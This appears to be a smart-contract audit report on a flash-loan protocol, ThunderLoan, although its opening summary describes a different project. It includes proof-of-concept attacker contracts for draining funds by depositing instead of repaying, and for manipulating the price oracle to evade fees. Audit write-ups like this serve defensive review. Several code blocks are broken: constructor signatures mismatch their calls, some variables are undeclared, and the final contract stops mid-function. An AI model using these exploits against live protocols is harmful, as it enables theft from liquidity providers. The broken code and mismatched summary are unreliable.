# Protocol Summary 

Puppy Rafle is a protocol dedicated to raffling off puppy NFTs with variying rarities. A portion of entrance fees go to the winner, and a fee is taken by another address decided by the protocol owner. 

## Roles

- Owner: The owner of the protocol who has the power to upgrade the implementation. 
- Liquidity Provider: A user who deposits assets into the protocol to earn interest. 
- User: A user who takes out flash loans from the protocol.

# Findings

## High 

### [H-1] Erroneous `ThunderLoan::updateExchangeRate` is the `deposit` function causes protocol to think it has more fees than it really does, whick blocks redemtion and incorrectly sets the exchange rate.

**Description:** 
In the thunderLoan protocol, the `exchangeRate` function is resposible of calculating the rate between the assetToken and underlying tokens. In a way, it is responsible tfor tracking of how much fee should be pass to the liquidyProviders.

However, the `deposit` function updates this rate without collecting any fees.

```javascript
    function deposit(
        IERC20 token,
        uint256 amount
    ) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) /
            exchangeRate;
@>      emit Deposit(msg.sender, token, amount);
@>      assetToken.mint(msg.sender, mintAmount);
        // @audit-high
        uint256 calculatedFee = getCalculatedFee(token, amount);
        assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    } 
```

**Impact:** 

1. The redeem function is blocked, because the owed tokens calculated is more than the token which the contract acuelly have.

2. Rewards are incorrectly calculated, leading to liquidity providers potentially getting way more or less that they desevred.


**Proof of Concept:**

1. Liquidity Provider deposits
2. User takes out a flash loan 
3. It is now impossible for Liquidity providers to redeem

<details>
<summary>Proof of code</summary>

Place the following into ThunderLoan.t.sol

```javascript
function testRedeemAfterLoan() public setAllowedToken hasDeposits {
    uint256 amountToBorrow = AMOUNT * 10;
    uint256 calculatedFee = thunderLoan.getCalculatedFee(
        tokenA,
        amountToBorrow
    );
    vm.startPrank(user);
    tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
    thunderLoan.flashloan(
        address(mockFlashLoanReceiver),
        tokenA,
        amountToBorrow,
        ""
    );
    vm.stopPrank();

    uint256 amountToRedeem = type(uint256).max;
    vm.startPrank(liquidityProvider);
    thunderLoan.redeem(tokenA, amountToRedeem);
}
```
</details>


**Recommended Mitigation:** 

Remove the incorrect updated exchange rate from the `deposit` function.

```diff
function deposit(
    IERC20 token,
    uint256 amount
) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) /
        exchangeRate;
    emit Deposit(msg.sender, token, amount);
    assetToken.mint(msg.sender, mintAmount);
    // @audit-high
-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);
    token.safeTransferFrom(msg.sender, address(assetToken), amount);
} 

```
### [H-2] By calling a flashloan and then ThunderLoan::deposit instead of ThunderLoan::repay users can steal all funds from the protocol

**Description:** 
The vulnerability allows a malicious user to exploit the protocol by misusing the ThunderLoan contractâ€™s functions. Specifically, the user can call a flashloan and, instead of repaying the loan via the intended `ThunderLoan::repay` function, they can deposit the funds back into the protocol using the `ThunderLoan::deposit` function. This results in the user gaining control over the borrowed funds without returning them, effectively allowing them to steal all funds from the protocol.


**Impact:** 
It will cause to lose all the liquidity providers money.

**Proof of Concept:**
<details>
<summary>Proof of code</summary>

Place this code into ThunderLoanTest.t.sol

```javascript

    function testUseDepositInsteadOfRepayToStealFunds()
        public
        setAllowedToken
        hasDeposits
    {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay depositOverRepay = new DepositOverRepay(
            address(thunderLoan)
        );
        tokenA.mint(user, fee);
        thunderLoan.flashloan(
            address(depositOverRepay),
            tokenA,
            amountToBorrow,
            ""
        );
        depositOverRepay.redeemMoney();
        vm.stopPrank();
        assert(tokenA.balanceOf(address(depositOverRepay)) > 50e18 + fee);
    }

```

```javascript
contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(
        address tswapPool,
        address _thunderLoan,
        address _repayAddress
    ) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /* initiator */,
        bytes calldata /* params */
    ) external returns (bool) {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        token.approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}
```
</details>

### [H-3] Mixing up variables locations causes storage collision in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentluFlashLoaning`, freezing protocol.

**Description:** `ThunderLoan.sol` has two variables in the following order:

```javascript
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
```
However, the upgraded contract `ThunderLoanUpgraded.sol` has them in a different order:

```javascript
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```
That due to how solidity works after the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. You can not adjsut the position of storage variable, and removing storage variables for constant variables, breaks storage ocation as well.


**Impact:** 

After the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee.

More importantlly, the `s_currentlyFlashLoaning` mapping will start in the run storage slot.

**Proof of Concept:**

<details>
<summary>Proof of code</summary>

Put the following code in the ThunderLoanTest.t.sol
```javascript

import {ThunderLoanUpgraded} from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
.
.
.
    function testUpgradebreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();

        console2.log("Fee before upgrade:", feeBeforeUpgrade);
        console2.log("Fee after upgrade:", feeAfterUpgrade);

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
```
</details>

You can also see the storage layout differences by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`.

**Recommended Mitigation:** 
If you must remove the storage variables, leave it black as to not mess up the storage slots.

```diff
-   uint256 private s_flashLoanFee; // 0.3% ETH fee
-   uint256 public constant FEE_PRECISION = 1e18;
+   uint256 private s_black; 
+   uint256 private s_flashLoanFee; // 0.3% ETH fee
+   uint256 public constant FEE_PRECISION = 1e18;

```

### [M-1] Using tswap as price oracle leads to price and oracle manipulation

**Description:** 
The tswap protocol is a constatnt formula based on AMM (Atomated Market Maker). The price of a token is determined by how many reserves are on ether side of the pool. Because of this it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, eseentially ignoring protocol fees. 

**Impact:** 
Liquidity providers will collect much fewer fee for providing liquidity.

**Proof of Concept:**

The following all happens in 1 transaction.

1. User takes a flash loan from ThunderLoan for 1000 tokenA. They are charged the original fee
fee1. During the flash loan, they do the following:
        1. User sells 1000 tokenA, tanking the price.
2. Instead of repaying right away, the user takes out another flash loan for another 1000
tokenA.
        1. Due to the fact that the way ThunderLoancalculates price based on the TSwapPool
this second flash loan is substaintially cheaper.

<details>

```javascript

function getPriceInWeth(address token) public view returns (
uint256) {
address swapPoolOfToken = IPoolFactory(s_poolFactory).
getPool(token);
@> return ITSwapPool(swapPoolOfToken).
getPriceOfOnePoolTokenInWeth();
}

```
</details>

3. The user then repays the first flash loan, and then repays the second flash loan.

<details>
<summary>Proof of code</summary>

Place the following into ThunderLoan.t.sol

```javascript
     function testCanManipuleOracleToIgnoreFees() public {
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");

        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        pf.createPool(address(tokenA));

        address tswapPool = pf.getPool(address(tokenA));

        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // Fund tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();

        // Set allow token
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);

        // Add liquidity to ThunderLoan
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();

        // TSwap has 100 WETH & 100 tokenA
        // ThunderLoan has 1,000 tokenA
        // If we borrow 50 tokenA -> swap it for WETH (tank the price) -> borrow another 50 tokenA (do something) ->
        // repay both
        // We pay drastically lower fees

        // here is how much we'd pay normally
        uint256 calculatedFeeNormal = thunderLoan.getCalculatedFee(tokenA, 100e18);

        uint256 amountToBorrow = 50e18; // 50 tokenA to borrow
        MaliciousFlashLoanReceiver flr =
        new MaliciousFlashLoanReceiver(address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18); // mint our user 10 tokenA for the fees
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 calculatedFeeAttack = flr.feeOne() + flr.feeTwo();
        console.log("Normal fee: %s", calculatedFeeNormal);
        console.log("Attack fee: %s", calculatedFeeAttack);
        assert(calculatedFeeAttack < calculatedFeeNormal);
    }
```

```javascript
contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    bool attacked;
    BuffMockTSwap pool;
    ThunderLoan thunderLoan;

    constructor(address tswapPool, address _thunderLoan, address _repayAddress) {
        pool = BuffMockTSwap(tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address, /* initiator */
        bytes calldata /* params */
    )
        external
        returns (bool)

        if (!attacked) {
            feeOne = fee;
            attacked = true;
            uint256 expected = pool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(pool), 50e18);
            pool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, expected, block.timestamp);
            // we call a 2nd flash loan
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // Repay at the end
            // We can't repay back! Whoops!

**Recommended Mitigation:** 
Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle.
